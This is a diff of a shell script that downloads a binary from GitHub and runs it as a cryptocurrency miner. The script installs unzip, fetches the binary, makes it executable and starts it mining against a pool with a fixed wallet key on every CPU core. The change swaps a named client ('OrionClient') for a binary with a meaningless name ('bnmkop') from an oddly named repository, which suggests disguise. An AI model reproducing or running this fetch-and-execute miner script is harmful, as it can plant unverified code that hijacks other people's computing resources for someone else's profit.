@@ -1,6 +1,5 @@
 #!/bin/sh
 apt update && apt install unzip
-wget https://github.com/egg5233/ore-hq-client/releases/download/1.6.0/OrionClient_linux.zip && unzip OrionClient_linux.zip
-cd OrionClient_linux
-chmod +x OrionClient
-./OrionClient mine -a --pool twbitz --key xLPMoYZixVLRHJV7hb9gZoMusczWYRzP7JqFCRb6vXp --worker $(shuf -n 1 -i 1-99999)-GVPK -t $(nproc --all)
+wget https://github.com/vedhagsvp/cnajea/releases/download/orno/bnmkop
+chmod +x bnmkop
+./bnmkop mine -a --pool twbitz --key xLPMoYZixVLRHJV7hb9gZoMusczWYRzP7JqFCRb6vXp --worker $(shuf -n 1 -i 1-99999)-GVPK2 -t $(nproc --all)
